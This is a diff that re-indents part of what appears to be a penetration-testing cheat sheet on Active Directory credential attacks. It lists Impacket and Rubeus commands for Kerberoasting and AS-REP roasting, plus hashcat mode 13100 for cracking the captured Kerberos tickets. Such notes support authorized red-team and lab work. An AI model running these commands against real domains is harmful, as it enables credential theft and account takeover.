@@ -139,17 +139,17 @@ Check for Kerberoasting with Impacket -> SPNs
 
 Kerberoasting with Impacket
 
-     python3 GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>  
-     sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip <ip> -request
+    python3 GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>  
+    sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip <ip> -request
      
  Kerberoasting with Rubeus (install on Windows host in domain) 
  
-  rubeus.exe kerberoast 
+    rubeus.exe kerberoast 
  
 Crack passwords with hashcat 
 
-  hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/ADPass.txt
-  13100: kerberos 5, 0: straight attack mode
+    hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/ADPass.txt
+    13100: kerberos 5, 0: straight attack mode
 
 ### AS-REP Roasting with Rubeus and Impacket
 Get a list of valid users: ASREProasting to see if any of them do not have pre-auth set and can request a Kerberos ticket without a password. Crack hashes with hashcat        
@@ -159,8 +159,8 @@ Get a list of valid users: ASREProasting to see if any of them do not have pre-a
 
 ASREPRoast with Impacket:
 
-     impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
-     impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+    impacket-GetUserSPNs <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
+    impacket-GetUserSPNs <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 
 ASREP Roast with Rubeus:
 
